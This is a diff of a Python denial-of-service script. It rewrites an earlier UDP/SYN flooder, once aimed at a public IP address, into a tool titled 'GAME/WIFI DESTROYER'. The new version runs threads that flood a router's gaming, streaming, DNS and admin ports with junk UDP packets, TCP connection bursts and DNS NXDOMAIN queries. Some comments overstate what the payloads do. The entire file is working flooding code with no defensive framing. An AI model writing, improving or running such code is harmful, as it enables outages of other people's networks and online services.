@@ -2,105 +2,197 @@ import socket
 import threading
 import time
 import random
+import struct
 
-router_ip = "62.109.121.42"
+target_ip = "192.168.1.1"  # ROUTER IP
+GAMING_PORTS = [3074, 3478, 3479, 3480, 27014, 27015, 27016, 27017, 27018, 25565]
+STREAMING_PORTS = [80, 443, 1935, 554, 8554]
+DNS_PORT = 53
 
-# Colors
-MAGENTA = '\033[95m'
 GREEN = '\033[92m'
 RED = '\033[91m'
+CYAN = '\033[96m'
 RESET = '\033[0m'
 
-# Stats tracking
-stats = {
-    "udp_sent": 0,
-    "syn_sent": 0,
-    "udp_data": 0,
-    "syn_data": 0,
-    "udp_success": 0,
-    "syn_success": 0,
-    "udp_fail": 0,
-    "syn_fail": 0
-}
-stats_lock = threading.Lock()
+# Gaming destruction payloads
+def gaming_kill_1():
+    """UDP to Xbox Live port (3074) with fake NAT data"""
+    return b'\x00' * 128
 
-# UDP Attack
-def udp_attack():
+def gaming_kill_2():
+    """PlayStation Network flood (3478-3480)"""
+    return b'\xff' * 256
+
+def gaming_kill_3():
+    """Steam game session flood"""
+    return b'\xaa' * 512
+
+def gaming_kill_4():
+    """Minecraft server (25565) ping flood"""
+    return b'\xfe\xfd\x09' + b'\x00' * 125
+
+def gaming_kill_5():
+    """Discord voice (UDP 3478-3480)"""
+    return b'\x02' * 64
+
+def gaming_kill_6():
+    """Twitch stream interrupt (1935 RTMP)"""
+    return b'RTMP' + b'\x00' * 124
+
+def gaming_kill_7():
+    """YouTube streaming (443) TLS alert"""
+    return b'\x15\x03\x03\x00\x02\x02\x46'
+
+def gaming_kill_8():
+    """Netflix/Prime video (80/443) session kill"""
+    return b'GET / HTTP/1.1\r\n\r\n'
+
+def gaming_kill_9():
+    """DNS gaming server resolution poison"""
+    domain = random.choice(['xboxlive.com', 'psn.com', 'steam.com', 'minecraft.net'])
+    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 0)
+    query += b''.join(struct.pack('B', len(part)) + part.encode() for part in domain.split('.'))[:-1]
+    query += b'\x00\x00\x01\x00\x01'
+    return query
+
+def gaming_kill_10():
+    """ICMP ping flood to gaming server IPs"""
+    return b'\x08\x00\xf7\xff' + b'\x00' * 56
+
+# Router CPU killer payloads
+def router_crash_1():
+    """SYN to all router admin ports"""
+    return b''
+
+def router_crash_2():
+    """UDP to router DHCP (67/68)"""
+    return b'\x00' * 300
+
+def router_crash_3():
+    """DNS NXDOMAIN bomb to router DNS"""
+    return b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07invalid\x03com\x00\x00\x01\x00\x01'
+
+def router_crash_4():
+    """HTTP flood to router web interface"""
+    return b'GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n'
+
+def router_crash_5():
+    """UDP to random high ports (state table exhaustion)"""
+    return b'X' * 1024
+
+GAMING_PAYLOADS = [gaming_kill_1, gaming_kill_2, gaming_kill_3, gaming_kill_4, gaming_kill_5,
+                   gaming_kill_6, gaming_kill_7, gaming_kill_8, gaming_kill_9, gaming_kill_10]
+
+ROUTER_PAYLOADS = [router_crash_1, router_crash_2, router_crash_3, router_crash_4, router_crash_5]
+
+# Stats
+stats = {"gaming_hits": 0, "router_hits": 0, "data_sent": 0}
+lock = threading.Lock()
+
+def gaming_interrupt():
+    """Direct attack on gaming/streaming traffic"""
     while True:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payload = random.randbytes(random.randint(500, 1450))
-            port = random.randint(1, 65535)
+            port = random.choice(GAMING_PORTS + STREAMING_PORTS)
+            payload_func = random.choice(GAMING_PAYLOADS)
+            payload = payload_func()
             
-            sock.sendto(payload, (router_ip, port))
-            data_sent = len(payload)
-            
-            with stats_lock:
-                stats["udp_sent"] += 1
-                stats["udp_data"] += data_sent
-                stats["udp_success"] += 1
-            sock.close()
-            
+            if port in [80, 443, 1935]:
+                # TCP for streaming
+                for _ in range(50):
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.01)
+                    sock.connect_ex((target_ip, port))
+                    sock.send(payload)
+                    sock.close()
+                    
+                    with lock:
+                        stats["gaming_hits"] += 1
+                        stats["data_sent"] += len(payload)
+            else:
+                # UDP for gaming
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                for _ in range(50):
+                    sock.sendto(payload, (target_ip, port))
+                    
+                    with lock:
+                        stats["gaming_hits"] += 1
+                        stats["data_sent"] += len(payload)
+                sock.close()
+                
         except:
-            with stats_lock:
-                stats["udp_fail"] += 1
+            pass
+        time.sleep(0.01)
 
-# SYN Attack  
-def syn_attack():
+def router_cripple():
+    """Crash router CPU/DNS"""
     while True:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.01)
-            port = random.randint(1, 65535)
+            payload_func = random.choice(ROUTER_PAYLOADS)
+            payload = payload_func()
             
-            result = sock.connect_ex((router_ip, port))
-            with stats_lock:
-                stats["syn_sent"] += 1
-                stats["syn_data"] += 64
-                if result == 0:
-                    stats["syn_success"] += 1
-                else:
-                    stats["syn_fail"] += 1
-            sock.close()
-            
+            if payload_func.__name__ == "router_crash_1":
+                # SYN flood to admin ports
+                for port in [80, 443, 23, 22, 8080]:
+                    for _ in range(25):
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(0.01)
+                        sock.connect_ex((target_ip, port))
+                        sock.close()
+                        
+                        with lock:
+                            stats["router_hits"] += 1
+                            stats["data_sent"] += 64
+            elif payload_func.__name__ == "router_crash_3":
+                # DNS bomb
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                for _ in range(100):
+                    sock.sendto(payload, (target_ip, DNS_PORT))
+                    
+                    with lock:
+                        stats["router_hits"] += 1
+                        stats["data_sent"] += len(payload)
+                sock.close()
+            else:
+                # General UDP flood
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                port = random.randint(10000, 60000)
+                for _ in range(100):
+                    sock.sendto(payload, (target_ip, port))
+                    
+                    with lock:
+                        stats["router_hits"] += 1
+                        stats["data_sent"] += len(payload)
+                sock.close()
+                
         except:
-            with stats_lock:
-                stats["syn_fail"] += 1
+            pass
+        time.sleep(0.01)
 
-# Start 6 UDP threads
-for _ in range(6):
-    threading.Thread(target=udp_attack, daemon=True).start()
+# Start attacks
+threading.Thread(target=gaming_interrupt, daemon=True).start()
+threading.Thread(target=router_cripple, daemon=True).start()
 
-# Start 4 SYN threads
-for _ in range(4):
-    threading.Thread(target=syn_attack, daemon=True).start()
+print(f"{RED}HK1-CORONA GAME/WIFI DESTROYER{RESET}")
+print(f"{CYAN}Target Router: {target_ip}{RESET}")
+print(f"{RED}Gaming Ports: {GAMING_PORTS}{RESET}")
+print(f"{RED}Streaming Ports: {STREAMING_PORTS}{RESET}")
+print()
 
-# Logging every 10s
 last_time = time.time()
 while True:
-    time.sleep(0.1)
-    current_time = time.time()
+    time.sleep(5)
     
-    if current_time - last_time >= 10:
-        with stats_lock:
-            total_sent = stats["udp_sent"] + stats["syn_sent"]
-            total_data = stats["udp_data"] + stats["syn_data"]
-            total_success = stats["udp_success"] + stats["syn_success"]
-            total_fail = stats["udp_fail"] + stats["syn_fail"]
-            
-            data_mb = total_data / (1024 * 1024)
-            pps = total_sent // 10
-            
-            print(f"{MAGENTA}2M50{RESET}:{GREEN}{total_sent}{RESET}:{GREEN}{data_mb:.2f}MB{RESET} ---> ({GREEN}{total_success}{RESET},{RED}{total_fail}{RESET})")
-            
-            # Reset counters
-            stats["udp_sent"] = 0
-            stats["syn_sent"] = 0
-            stats["udp_data"] = 0
-            stats["syn_data"] = 0
-            stats["udp_success"] = 0
-            stats["syn_success"] = 0
-            stats["udp_fail"] = 0
-            stats["syn_fail"] = 0
-            
-        last_time = current_time
+    with lock:
+        gaming = stats["gaming_hits"]
+        router = stats["router_hits"]
+        data_mb = stats["data_sent"] / (1024 * 1024)
+        
+        stats["gaming_hits"] = 0
+        stats["router_hits"] = 0
+        stats["data_sent"] = 0
+    
+    total = gaming + router
+    print(f"HK1:{GREEN}{total}{RESET}:{GREEN}{data_mb:.2f}MB{RESET}")
+    print(f"{CYAN}Gaming Hits: {RED}{gaming}{RESET} | Router Hits: {RED}{router}{RESET}")
+    print()
